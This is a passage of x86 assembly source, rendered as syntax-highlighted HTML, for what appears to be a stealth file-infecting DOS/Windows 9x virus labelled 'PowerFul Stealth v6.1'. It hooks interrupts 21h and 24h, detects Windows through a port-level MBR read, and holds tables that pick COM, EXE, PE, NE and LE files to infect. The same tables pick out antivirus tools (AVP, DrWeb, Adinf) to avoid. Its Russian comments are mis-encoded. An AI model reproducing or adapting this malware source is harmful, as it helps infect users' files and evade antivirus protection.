        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">hooked_win_int21</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_install_int21_hook</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">entry_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">exit_install_int21_hook</span><span class="sc0">
</span><span class="sc5">int21_hook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">check_windows_present</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_install_int21_hook</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">hooked_win_int21</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">hooked_win_int21</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">hooked_win_int21_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">exit_install_int21_hook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;¯¨á ­¨¥: p®æ¥¤ãp  ¤¥â¥ªâ¨p®¢ ­¨ï Windows 95/98</span><span class="sc0">
</span><span class="sc1">;‚å®¤:  ES:[DI] - ¢p¥¬¥­­ë© ¡ãää¥p ¢ p §¬¥p¥ 200h</span><span class="sc0">
</span><span class="sc1">;‚ëå®¤: CF = 1  - DOS</span><span class="sc0">
</span><span class="sc1">;       CF = 0  - Windows</span><span class="sc0">
</span><span class="sc5">check_windows_present</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_mbr_via_port</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0ffffh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">DOS_present</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">DOS_present</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">set_our_int24</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int24</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int24</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">wrong_dos_function</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">; ®áâ ¢¨âì áâ p®¥ 24-®¥ ¯p¥pë¢ ­¨¥ ­  ¬¥áâ®</span><span class="sc0">
</span><span class="sc5">set_old_int24</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int24</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;è¨¡®ç­ ï ¤®á äã­ªæ¨ï</span><span class="sc0">
</span><span class="sc5">wrong_dos_function</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">old_int24</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">begin_solve_crc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc3">"PowerFul Stealth v6.1 (c)'98 DK eyegabooom"</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;®¤¯p®£p ¬¬  ¤¥â¥ªâ¨p®¢ ­¨ï ä ©«  (c)'98 DK</span><span class="sc0">
</span><span class="sc1">;ˆá¯®«ì§ã¥âáï ¢¨pãá ¬¨ ¤«ï ®¯p¥¤¥«¥­¨ï ª ª®© ä ©« ¬®¦­® § p ¦ âì,  </span><span class="sc0">
</span><span class="sc1">;ª ª®© ­¥«ì§ï.</span><span class="sc0">
</span><span class="sc1">;‚å®¤:  DS:DX - ãª §ë¢ ¥â ­  áâp®ªã ¢ ä®p¬¥: "¤¨áª:\¯ãâì\¨¬ï ä ©« ",0</span><span class="sc0">
</span><span class="sc1">;       „®«¦­  ¡ëâì ®¯p¥¤¥«¥­  ¯®¤¯p®£p ¬¬  call_int21, å®âï ¡ë ¢®â â ª®£®</span><span class="sc0">
</span><span class="sc1">;       á®¤¥p¦ ­¨ï:</span><span class="sc0">
</span><span class="sc1">;       call_int21 proc near</span><span class="sc0">
</span><span class="sc1">;       int   21h</span><span class="sc0">
</span><span class="sc1">;       retn</span><span class="sc0">
</span><span class="sc1">;       call_int21 endp</span><span class="sc0">
</span><span class="sc1">;‚ëå®¤: ‘¬®âp¨â¥ ®¯¨á ­¨¥ ª ¯¥p¥¬¥­­ë¬:</span><span class="sc0">
</span><span class="sc1">;       1) filename</span><span class="sc0">
</span><span class="sc1">;       2) extention</span><span class="sc0">
</span><span class="sc1">;       3) filemask</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¸</span><span class="sc0">
</span><span class="sc1">;0, ¥á«¨ ­¥ ®¤­® ¨¬ï ¨§ ¯¥p¥ç­ï FILENAMES ­¥ á®¢¯ «®.          ;³</span><span class="sc0">
</span><span class="sc1">;ˆ­ ç¥ ­®¬¥p áâp®ª¨ á®¢¯ ¢è¥£® ¨¬¥­¨.                          ;³</span><span class="sc0">
</span><span class="sc1">;H ¯p¨¬¥p ¥á«¨ ¢å®¤­®¥ DS:DX ãª §ë¢ ¥â ­  'D:\AVP.EXE', â®     ;³</span><span class="sc0">
</span><span class="sc1">;­  ¢ëå®¤¥ ¨§ ¯®¤¯p®£p ¬¬ë filename ¡ã¤¥â p ¢­  1.             ;³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">;”®p¬ â ¯¥p¥ç­ï ¨¬¥­ ä ©«®¢:                                   ;³</span><span class="sc0">
</span><span class="sc1">;1) ¯¥p¢ë¬ ¡ ©â®¬ ¨¤¥â ¤«¨­­  ¨¬¥­¨. p¨¬¥p 4,'ABCD'           ;³</span><span class="sc0">
</span><span class="sc1">;2) ¯®â®¬ á ¬® ¨¬ï (¡®«ìè¨¬¨ ¡ãª¢ ¬¨)                          ;³</span><span class="sc0">
</span><span class="sc1">;3) ¨ â.¤ ¤pã£¨¥ ¨¬¥­                                          ;³</span><span class="sc0">
</span><span class="sc1">;4) ¯¥p¥ç¥­ì ¤®«¦¥­ § ª ­ç¨¢ âìáï ¡ ©â®¬ 0ffh                  ;³</span><span class="sc0">
</span><span class="sc5">filenames</span><span class="sc4">:</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc5">number_filename_no_mask_checked</span><span class="sc4">=</span><span class="sc2">5</span><span class="sc0">                      </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc1">;ˆ¬¥­  ­¥ ¯p®¢¥pï¥¬ë¥ ­  p áè¨p¥­¨¥/¬ áªã              ;³</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc12">'CON'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;Œ áª  ­¥ ¯p®¢¥pï¥âáï          ;³1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc12">'AUX'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;Œ áª  ­¥ ¯p®¢¥pï¥âáï          ;³2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc12">'PRN'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;Œ áª  ­¥ ¯p®¢¥pï¥âáï          ;³3</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc12">'COM1'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;Œ áª  ­¥ ¯p®¢¥pï¥âáï          ;³4</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc12">'COM2'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;Œ áª  ­¥ ¯p®¢¥pï¥âáï          ;³5</span><span class="sc0">
        </span><span class="sc1">;ˆ¬¥­  ¯p®¢¥pï¥¬ë¥ ­  p áè¨p¥­¨¥/¬ áªã                 ;³</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc12">'AVP.EXE'</span><span class="sc0">                                  </span><span class="sc1">;³6</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0FFh</span><span class="sc0"> </span><span class="sc1">; - p¨§­ ª ª®­æ                         ;³</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍµ</span><span class="sc0">
</span><span class="sc1">;0, ¥á«¨ ­¥ ®¤­® p áè¨p¥­¨¥ ¨§ ¯¥p¥ç­ï extentions ­¥ á®¢¯ «®.  ;³</span><span class="sc0">
</span><span class="sc1">;ˆ­ ç¥ ­®¬¥p áâp®ª¨ á®¢¯ ¢è¥£® p áè¨p¥­¨ï.                     ;³</span><span class="sc0">
</span><span class="sc1">;H ¯p¨¬¥p, ¥á«¨ ¢å®¤­®¥ DS:DX ãª §ë¢ ¥â ­  'D:\AVP.EXE', â®    ;³</span><span class="sc0">
</span><span class="sc1">;­  ¢ëå®¤¥ ¨§ ¯®¤¯p®£p ¬¬ë extention ¡ã¤¥â p ¢­® 3.            ;³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">;‘¬. ä®p¬ â ¯¥p¥ç­ï ¨¬¥­ ä ©«®¢                                ;³</span><span class="sc0">
</span><span class="sc5">extentions</span><span class="sc4">:</span><span class="sc0">                                                    </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc12">'COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc12">'EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0FFh</span><span class="sc0">  </span><span class="sc1">; - p¨§­ ª ª®­æ                        ;³</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍµ</span><span class="sc0">
</span><span class="sc1">;0, ¥á«¨ ­¥ ®¤­  ¬ áª  ¨§ ¯¥p¥ç­ï filemasks ­¥ á®¢¯ « .        ;³</span><span class="sc0">
</span><span class="sc1">;ˆ­ ç¥ ­®¬¥p áâp®ª¨ á®¢¯ ¢è¥© ¬ áª¨.                           ;³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">;”®à¬ â:                                                        ³</span><span class="sc0">
</span><span class="sc1">;1) ‘«®¢® á¬¥é¥­¨ï ¬ áª¨                                        ³</span><span class="sc0">
</span><span class="sc1">;2) Š«îç¥¢®© ¡ ©â                                               ³</span><span class="sc0">
</span><span class="sc1">;   0 - (1) ¨ ¥áâì á¬¥é¥­¨¥ ¬ áª¨                               ³</span><span class="sc0">
</span><span class="sc1">;   1 - ‘¬¥é¥­¨¥ ¡¥p¥âáï ¨§ ä ©«  ¯® (1)                        ³</span><span class="sc0">
</span><span class="sc1">;   2 - ‘¬¥é¥­¨¥ ¡¥p¥âáï ¨§ ä ©«  ¯® (1)*10h                    ³</span><span class="sc0">
</span><span class="sc1">;   3 - ‘¬¥é¥­¨¥ ¡¥p¥âáï ®â ª®­æ                                ³</span><span class="sc0">
</span><span class="sc1">;3) „«¨­­  ¬ áª¨                                                ³</span><span class="sc0">
</span><span class="sc1">;4) Œ áª :                                                      ³</span><span class="sc0">
</span><span class="sc1">;   a)  ‘¨¬¢®« '?' - «î¡®¥ ç¨á«®                                ³</span><span class="sc0">
</span><span class="sc1">;   b)  ‘¨¬¢®« '*' - «î¡®© §­ ª                                 ³</span><span class="sc0">
</span><span class="sc1">;5) ¥p¥ç¥­ì ¤®«¦¥­ § ª ­ç¨¢ âìáï á¨¬¢®«®¬ 0ffh                 ³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc5">filemasks</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;³                 ³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">0004h</span><span class="sc0">                       </span><span class="sc1">;³ Infected files  ³</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">02Eh</span><span class="sc0">       </span><span class="sc1">;³ by PFL v6.1     ³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">0007h</span><span class="sc0">                       </span><span class="sc1">;³ DrWeb All DOS   ³</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc12">'DrW?.??'</span><span class="sc0">               </span><span class="sc1">;³                 ³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">0040h</span><span class="sc0">                       </span><span class="sc1">;³ DrWeb All DOS   ³</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0F3h</span><span class="sc4">,</span><span class="sc2">0A5h</span><span class="sc4">,</span><span class="sc2">4Bh</span><span class="sc0">     </span><span class="sc1">;³                 ³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">001Bh</span><span class="sc0">                       </span><span class="sc1">;³ Adinf           ³</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'????'</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">           </span><span class="sc1">;³                 ³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">003Ch</span><span class="sc0">                       </span><span class="sc1">;³ Windows 95-98   ³</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc12">'PE'</span><span class="sc0">                    </span><span class="sc1">;³ PE App          ³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">003Ch</span><span class="sc0">                       </span><span class="sc1">;³ Windows 3.x     ³</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc12">'NE'</span><span class="sc0">                    </span><span class="sc1">;³ NE App          ³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">003Ch</span><span class="sc0">                       </span><span class="sc1">;³ Windows 95-98   ³</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc12">'LE'</span><span class="sc0">                    </span><span class="sc1">;³ LE App          ³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">0008h</span><span class="sc0">                       </span><span class="sc1">;³ DOS EXE DRIVERS ³</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;³                 ³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">0008h</span><span class="sc0">                       </span><span class="sc1">;³ DOS EXE DRIVERS ³</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">     </span><span class="sc1">;³                 ³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0ffh</span><span class="sc0"> </span><span class="sc1">; - p¨§­ ª ª®­æ  ¡ §ë                    ³</span><span class="sc0">
